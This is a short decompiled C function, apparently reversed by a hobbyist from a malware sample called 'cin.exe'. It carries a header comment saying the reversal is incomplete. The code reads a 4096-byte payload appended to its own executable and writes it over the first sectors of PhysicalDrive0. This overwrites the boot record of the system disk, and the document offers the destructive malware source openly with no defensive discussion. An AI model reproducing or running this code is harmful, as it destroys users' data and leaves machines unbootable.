//cin.exe :lol:
//reversed by citraX
//youtube.com/watch?v=yCl8nzquPUc
//i dont know what is origin language(maybe C++)
//WARNING! THIS IS NOT FULL REVERSE CODE. MAYBE IT DOESNT WORKING. NOTE THAT.

BOOL sub_401000()
{
  HMODULE ModuleHandleA; // eax
  HANDLE FileA; // esi
  DWORD FileSize; // eax
  HANDLE FileW; // esi
  DWORD NumberOfBytesRead; // [esp+8h] [ebp-1110h] BYREF
  char Buffer[4096]; // [esp+Ch] [ebp-110Ch] BYREF
  CHAR Filename[264]; // [esp+100Ch] [ebp-10Ch] BYREF

  ModuleHandleA = GetModuleHandleA(0);
  GetModuleFileNameA(ModuleHandleA, Filename, 0x104u);
  FileA = CreateFileA(Filename, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  FileSize = GetFileSize(FileA, 0);
  SetFilePointer(FileA, FileSize - 4097, 0, 0);
  ReadFile(FileA, Buffer, 0x1000u, &NumberOfBytesRead, 0);
  CloseHandle(FileA);
  FileW = CreateFileW(L"\\\\.\\PhysicalDrive0", 0x10000000u, 3u, 0, 3u, 0, 0);
  if ( FileW == (HANDLE)-1 )
  {
    MessageBoxW(0, L"Failed 1", L"Error", 0x10u);
    ExitProcess(1u);
  }
  if ( !WriteFile(FileW, Buffer, 0x1000u, &NumberOfBytesRead, 0) )
  {
    MessageBoxW(0, L"Failed 2", L"Error", 0x10u);
    ExitProcess(2u);
  }
  return CloseHandle(FileW);
}